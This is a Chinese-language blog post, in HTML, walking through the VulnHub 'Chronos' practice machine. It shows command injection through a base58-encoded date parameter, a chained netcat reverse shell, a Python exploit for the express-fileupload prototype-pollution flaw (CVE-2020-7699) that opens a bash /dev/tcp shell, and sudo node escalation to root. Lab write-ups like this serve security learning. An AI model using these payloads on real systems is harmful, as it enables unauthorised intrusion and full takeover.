@@ -1,0 +1,297 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x03-VulnHub靶机-Chronos | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x03-VulnHub靶机-Chronos | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+0x03
+靶机地址：https://www.vulnhub.com/entry/chronos-1,735/
+靶机用VMware打不开
+难度  中
+几个符号的区别https://blog.csdn.net/weixin_4545922..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x03-VulnHub靶机-Chronos
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-01
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>0x03</p>
+<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>靶机用VMware打不开</p>
+<p>难度  中</p>
+<p>几个符号的区别https://blog.csdn.net/weixin_45459224/article/details/103992087</p>
+<h3 id="内容">内容</h3>
+<ul>
+<li>js代码混淆还原</li>
+<li>编码解码   https://gchq.github.io/CyberChef/</li>
+<li>命令注入 反弹shell</li>
+<li>nc串联</li>
+<li>代码审计</li>
+<li>框架漏洞(搜利用代码)</li>
+</ul>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的主机扫描   端口扫描</p>
+<p>nmap -Pn -sT -p80,8000 -sV 192.168.3.92</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402291718972.png" alt="image-20240229171841946" loading="lazy"></figure>
+<p>去访问看看 再扫扫目录</p>
+<p>发现个这个 文件遍历 但是没有什么利用的</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402291728578.png" alt="" loading="lazy"></figure>
+<p>再看看80的源码   发现有一段js代码    拉出来看	  发现是被混淆过的   用这个网站 https://gchq.github.io/CyberChef/ 去还原一下</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292028382.png" alt="image-20240229202827358" loading="lazy"></figure>
+<p>发现了一个可疑的url地址    http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL    直接访问是看不到东西的 想到修改host文件 域名就可以解析了 有些东西就会出来</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292033506.png" alt="image-20240229203300407" loading="lazy"></figure>
+<p>再次去访问 http://192.168.3.92/     (我谷歌浏览器不显示下面的  火狐可以 )</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292111406.png" alt="" loading="lazy"></figure>
+<p>去访问 http://192.168.3.92:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292048797.png" alt="image-20240229204852767" loading="lazy"></figure>
+<p>发生了变化  用burp抓包看看</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292116396.png" alt="image-20240229211625371" loading="lazy"></figure>
+<p>这个包也会显示时间那些东西</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292116886.png" alt="image-20240229211647857" loading="lazy"></figure>
+<p>有点像kali里面的 date</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292055712.png" alt="image-20240229205500688" loading="lazy"></figure>
+<p>先把format参数后面这段加密的解密出来 base58加密  还是用到上面的那个网站</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292057417.png" alt="image-20240229205730356" loading="lazy"></figure>
+<p>'+Today is %A, %B %d, %Y %H:%M:%S.'    再结合上面页面的图片 进一步确认是使用了 date命令</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292058510.png" alt="image-20240229205818485" loading="lazy"></figure>
+<p>我们可以用到 linux语法拼接去执行我们想要去执行的命令</p>
+<p>'+Today is %A, %B %d, %Y %H:%M:%S.'  | ls   再去进行 base58 encode</p>
+<p>真的可以执行命令!</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292119467.png" alt="image-20240229211933436" loading="lazy"></figure>
+<h2 id="渗透">渗透</h2>
+<h3 id="nc串联">nc串联</h3>
+<p>这个时候就可以去反弹shell了   先用命令可看有没有nc       &amp;&amp;ls /bin       (搞这里的时候 不知道上面毛病 发包卡 后面好了)</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292152860.png" alt="image-20240229215233827" loading="lazy"></figure>
+<p>再试试nc 可不可以用 然后-e参数行不行 （其实也可以直接一步到胃</p>
+<p>&amp;&amp; nc 192.168.3.87 4444 | /bin/bash | nc 192.168.3.87 5555   （&amp;&amp;跟|差不多</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292148491.png" alt="image-20240229214812464" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292147260.png" alt="image-20240229214740211" loading="lazy"></figure>
+<h3 id="代码审计">代码审计</h3>
+<p>(其实还有个看看有什么用户的 ) cat /etc/passwd  有/bin/bash的</p>
+<p>这个时候我们拿到了个shell了</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null    没发现什么可以利用的suid</p>
+<p>sudo -l   uname -a  都不好利用提权</p>
+<p>这个时候 我们就去翻翻源码 看能不能找到什么别的东西</p>
+<p>这是一套由nodejs搭建的网站</p>
+<p>​    看到 app.js   其实他是做了检测的 但是没有后续别的操作了</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292205223.png" alt="image-20240229220519189" loading="lazy"></figure>
+<p>package.json里面可以看到所使用的库</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292206559.png" alt="image-20240229220629540" loading="lazy"></figure>
+<p>还看到了一个chronos-v2   也可以去看看</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292213832.png" alt="image-20240229221342811" loading="lazy"></figure>
+<p>发现 backend后端   frontend 前端</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292229519.png" alt="image-20240229222925499" loading="lazy"></figure>
+<p>翻到一个上传的点 搭载他服务器的本地的  所以访问不到。</p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292234874.png" alt="image-20240229223413819" loading="lazy"></figure>
+<p>而package.json中多了一个模块，express-fileupload</p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292235536.png" alt="image-20240229223542506" loading="lazy"></figure>
+<p>通过搜索引擎，发现node.js有一个“原型污染“的漏洞，漏洞编号CVE-2020-7699，而这个漏洞的要求是”parseNested”特征为ture，靶机刚好满足这个要求，那么寻找exp</p>
+<p>根据实际情况修改修改 (py脚本)</p>
+<pre><code>import requests
+cmd = 'bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.3.87/1234 0&gt;&amp;1&quot;'
+#pollute
+requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': ( None, f&quot;x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x&quot;)})
+#execute command
+
+requests.get('http://127.0.0.1:8080')
+</code></pre>
+<p>再wget下载到本地  wget http://192.168.3.87:8000/shell1.py   下到tmp目录</p>
+<p>然后执行(python3)</p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292307955.png" alt="image-20240229230753857" loading="lazy"></figure>
+<p>拿到了另外一个用户</p>
+<h2 id="提权">提权</h2>
+<p>拿到home目录下 imera账号里面的flag</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292309746.png" alt="image-20240229230902703" loading="lazy"></figure>
+<p>还不是root  试图提到root     node有sudo权限</p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292310675.png" alt="image-20240229231021648" loading="lazy"></figure>
+<p>去找利用代码</p>
+<p>sudo node -e 'require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, {stdio: [0, 1, 2]})'</p>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402292311056.png" alt="image-20240229231158965" loading="lazy"></figure>
+<p>拿到root</p>
+<h1 id="总结">总结</h1>
+<p>每次打靶都会遇到一两点莫名其妙的卡住 操作一样就是复现不了</p>
+<p>有的时候常规的提权没思路了  可以去翻翻代码看看  如数据库配置 功能代码 看看能不能进一步利用</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a><br>
+*
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%B8%97%E9%80%8F">渗透</a>
+<ul>
+<li><a href="#nc%E4%B8%B2%E8%81%94">nc串联</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/vulnhub-ba-ji-easy_cloudantivirus/">
+              <h3 class="post-title">
+                0x02-VulnHub靶机-easy_cloudantivirus
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
